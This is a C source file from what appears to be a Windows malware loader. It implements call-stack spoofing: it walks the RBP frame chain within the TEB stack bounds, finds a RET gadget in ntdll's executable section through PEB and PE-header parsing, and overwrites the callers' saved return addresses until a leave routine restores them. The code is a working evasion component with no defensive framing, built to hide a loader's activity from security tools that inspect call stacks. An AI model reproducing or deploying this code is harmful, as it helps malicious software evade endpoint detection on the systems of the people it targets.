/* Call-stack spoofing. Default: stubs (Go's runtime owns its
 * goroutine stacks; rewriting unwind metadata breaks stack growth
 * and garbage collection).
 *
 * With PALACE_SPOOF (native only): capture the RBP chain's saved
 * return addresses, overwrite them with a RET gadget inside
 * ntdll's executable section, and restore the originals on leave.
 * Capture validates every link (non-null, ascending, bounded
 * step); any anomaly aborts before overwriting anything. While
 * spoofed the loader only issues non-alertable waits, so no APC
 * can return through a spoofed address. The unity build uses
 * -fno-omit-frame-pointer so loader frames chain. */
#include "loader.h"
#include "services.h"

#ifndef PALACE_SPOOF

int spoof_enter(void) {
    return 0;
}

void spoof_leave(void) {
}

#else

#define SPOOF_MAX 8

static void **spoof_slots[SPOOF_MAX];
static void *spoof_orig[SPOOF_MAX];
static int spoof_n = 0;
static int spoof_active = 0;

static uint32_t spoof_u32(const void *p) {
    const uint8_t *b = (const uint8_t *)p;
    return (uint32_t)b[0] | ((uint32_t)b[1] << 8) | ((uint32_t)b[2] << 16) | ((uint32_t)b[3] << 24);
}

static uint16_t spoof_u16(const void *p) {
    const uint8_t *b = (const uint8_t *)p;
    return (uint16_t)(b[0] | ((uint16_t)b[1] << 8));
}

/* First RET byte in ntdll's first executable section. */
static void *find_gadget(void) {
    uint8_t *base = (uint8_t *)peb_module_base("ntdll.dll");
    if (!base || base[0] != 'M' || base[1] != 'Z')
        return 0;
    uint32_t pe = spoof_u32(base + 0x3C);
    if (pe > 0x1000)
        return 0;
    uint8_t *nt = base + pe;
    uint16_t nsec = spoof_u16(nt + 6);
    uint16_t opt = spoof_u16(nt + 20);
    if (nsec > 96)
        return 0;
    uint8_t *sec = nt + 24 + opt;
    for (uint16_t i = 0; i < nsec; i++, sec += 40) {
        uint32_t chars = spoof_u32(sec + 36);
        if (!(chars & 0x20000000u)) /* IMAGE_SCN_MEM_EXECUTE */
            continue;
        uint32_t vsize = spoof_u32(sec + 8);
        uint32_t vaddr = spoof_u32(sec + 12);
        if (vsize > 0x100000)
            vsize = 0x100000;
        uint8_t *code = base + vaddr;
        for (uint32_t j = 0; j < vsize; j++) {
            if (code[j] == 0xC3)
                return code + j;
        }
        return 0;
    }
    return 0;
}

int spoof_enter(void) {
    if (spoof_active)
        return spoof_n;
    /* TEB stack bounds gate every link. */
    void *stack_base = 0, *stack_limit = 0;
    __asm__ volatile("movq %%gs:0x08, %0" : "=r"(stack_base));
    __asm__ volatile("movq %%gs:0x10, %0" : "=r"(stack_limit));
    void **fp = 0;
    __asm__ volatile("movq %%rbp, %0" : "=r"(fp));
    /* Skip our own frame: overwriting our own return slot would
     * redirect spoof_enter's own return into the gadget. Every
     * recorded slot belongs to an ancestor frame, which cannot
     * return (consuming its slot) before spoof_leave restores it. */
    if (!fp || ((uintptr_t)fp & 7) || (void **)fp < (void **)stack_limit || (void *)(fp + 1) >= stack_base)
        return 0;
    fp = (void **)*fp;
    int n = 0;
    void **prev = 0;
    while (fp && n < SPOOF_MAX) {
        if ((uintptr_t)fp & 7)
            break;
        if ((void **)fp < (void **)stack_limit || (void *)(fp + 1) >= stack_base)
            break;
        if (prev && (fp <= prev || fp - prev > 8192))
            break;
        spoof_slots[n] = fp + 1;
        spoof_orig[n] = *(fp + 1);
        n++;
        prev = fp;
        fp = (void **)*fp;
    }
    if (n < 1) {
        spoof_n = 0;
        return 0; /* no caller frame captured */
    }
    void *gadget = find_gadget();
    if (gadget) {
        for (int i = 0; i < n; i++)
            *spoof_slots[i] = gadget;
    }
    spoof_n = n;
    spoof_active = 1;
    return n;
}

void spoof_leave(void) {
    if (!spoof_active)
        return;
    for (int i = 0; i < spoof_n; i++)
        *spoof_slots[i] = spoof_orig[i];
    spoof_n = 0;
    spoof_active = 0;
}

#endif
